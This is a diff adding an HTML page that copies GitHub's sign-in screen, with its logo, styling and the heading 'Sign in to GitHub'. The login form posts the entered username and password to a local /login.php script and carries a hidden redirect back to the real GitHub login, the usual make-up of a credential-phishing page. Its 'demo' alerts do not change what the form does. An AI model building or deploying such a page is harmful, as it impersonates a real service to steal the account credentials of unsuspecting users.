@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GitHub: Let's build from here · GitHub</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f6f8fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 340px;
+            width: 100%;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .logo svg {
+            width: 48px;
+            height: 48px;
+            fill: #000000;
+        }
+        
+        .logo h1 {
+            color: #000000;
+            font-size: 24px;
+            font-weight: 300;
+            margin-top: 8px;
+        }
+        
+        .card {
+            background: white;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card label {
+            font-size: 14px;
+            font-weight: 400;
+            margin-bottom: 6px;
+            color: #1f2328;
+        }
+        
+        .card input {
+            height: 46px;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            font-size: 14px;
+            padding: 0 12px;
+            margin-bottom: 16px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #0969da;
+            box-shadow: 0 0 0 3px rgba(9,105,218,0.3);
+        }
+        
+        .card input::placeholder {
+            color: #6e7781;
+        }
+        
+        .card button {
+            background: #2da44e;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 500;
+            color: white;
+            height: 46px;
+            cursor: pointer;
+            margin: 8px 0 16px;
+            transition: background 0.2s;
+        }
+        
+        .card button:hover {
+            background: #2c974b;
+        }
+        
+        .card a {
+            color: #0969da;
+            font-size: 12px;
+            text-decoration: none;
+            margin-bottom: 8px;
+            display: inline-block;
+        }
+        
+        .card a:hover {
+            text-decoration: underline;
+        }
+        
+        .password-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px;
+        }
+        
+        .password-row label {
+            margin-bottom: 0;
+        }
+        
+        .password-row a {
+            margin-bottom: 0;
+            font-size: 12px;
+        }
+        
+        .footer {
+            margin-top: 16px;
+            font-size: 12px;
+            color: #656d76;
+            text-align: center;
+            border-top: 1px solid #d0d7de;
+            padding-top: 16px;
+        }
+        
+        .footer a {
+            color: #0969da;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        /* Passkey section (modern GitHub) */
+        .passkey-section {
+            margin: 16px 0;
+            padding: 12px;
+            background: #f6f8fa;
+            border: 1px solid #d0d7de;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        
+        .passkey-section:hover {
+            background: #eaeef2;
+        }
+        
+        .passkey-section span {
+            margin-right: 8px;
+        }
+        
+        /* Security notice */
+        .security-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 16px 0 0;
+            font-size: 12px;
+            color: #656d76;
+        }
+        
+        .security-notice span {
+            margin: 0 4px;
+        }
+        
+        /* Create account link */
+        .create-account {
+            text-align: center;
+            margin: 16px 0 0;
+            font-size: 14px;
+        }
+        
+        .create-account a {
+            color: #0969da;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Mobile responsive */
+        @media (max-width: 400px) {
+            .password-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <!-- GitHub logo as SVG for perfect rendering -->
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.42 2.865 8.166 6.839 9.489.5.092.682-.217.682-.482 0-.237-.008-.866-.013-1.7-2.782.603-3.369-1.34-3.369-1.34-.454-1.156-1.11-1.462-1.11-1.462-.908-.62.069-.608.069-.608 1.003.07 1.531 1.03 1.531 1.03.892 1.529 2.341 1.087 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.11-4.555-4.943 0-1.091.39-1.984 1.03-2.682-.103-.253-.447-1.27.098-2.646 0 0 .84-.269 2.75 1.025.8-.223 1.65-.334 2.5-.334.85 0 1.7.111 2.5.334 1.91-1.294 2.75-1.025 2.75-1.025.545 1.376.201 2.393.099 2.646.64.698 1.03 1.591 1.03 2.682 0 3.841-2.34 4.687-4.57 4.935.36.309.68.919.68 1.852 0 1.336-.012 2.415-.012 2.743 0 .267.18.578.688.48C19.138 20.161 22 16.418 22 12c0-5.523-4.477-10-10-10z"></path>
+            </svg>
+            <h1>Sign in to GitHub</h1>
+        </div>
+        
+        <div class="card">
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://github.com/login">
+                
+                <label for="username">Username or email address</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username or email" required autofocus>
+                
+                <div class="password-row">
+                    <label for="password">Password</label>
+                    <a href="#" onclick="alert('Password reset demo'); return false;">Forgot password?</a>
+                </div>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                
+                <button type="submit">Sign in</button>
+            </form>
+            
+            <div class="passkey-section" onclick="alert('Passkey login demo'); return false;">
+                <span>🔑</span>
+                <span>Sign in with a passkey</span>
+            </div>
+            
+            <div class="security-notice">
+                <span>🔒</span>
+                <span>Secure connection</span>
+                <span>•</span>
+                <span>GitHub © 2025</span>
+            </div>
+        </div>
+        
+        <div class="create-account">
+            <a href="#" onclick="alert('Signup page demo'); return false;">Create an account</a>
+        </div>
+        
+        <div class="footer">
+            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
+            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
+            <a href="#" onclick="alert('Security demo'); return false;">Security</a>
+            <a href="#" onclick="alert('Contact demo'); return false;">Contact</a>
+        </div>
+    </div>
+
+    <script>
+        // Form validation
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                e.preventDefault();
+                alert('Please enter both username and password');
+                return;
+            }
+        });
+        
+        // Input effects
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('focus', function() {
+                this.style.borderColor = '#0969da';
+            });
+            
+            input.addEventListener('blur', function() {
+                if (!this.value) {
+                    this.style.borderColor = '#d0d7de';
+                }
+            });
+        });
+        
+        // Fake typing detection for developer vibe
+        let typingTimer;
+        inputs.forEach(input => {
+            input.addEventListener('keyup', function() {
+                clearTimeout(typingTimer);
+                typingTimer = setTimeout(() => {
+                    if (this.value.length > 3) {
+                        // Simulate GitHub's "checking username" feature
+                        if (this.id === 'username') {
+                            console.log('Checking username availability...');
+                        }
+                    }
+                }, 600);
+            });
+        });
+        
+        // Passkey section hover effect
+        const passkeySection = document.querySelector('.passkey-section');
+        passkeySection.addEventListener('click', function() {
+            // Just demo - real would trigger passkey flow
+        });
+        
+        // Prevent form resubmission
+        if (window.history.replaceState) {
+            window.history.replaceState(null, null, window.location.href);
+        }
+        
+        // Add slight delay to simulate loading (optional)
+        window.addEventListener('load', function() {
+            document.getElementById('username').focus();
+        });
+    </script>
+</body>
+</html>
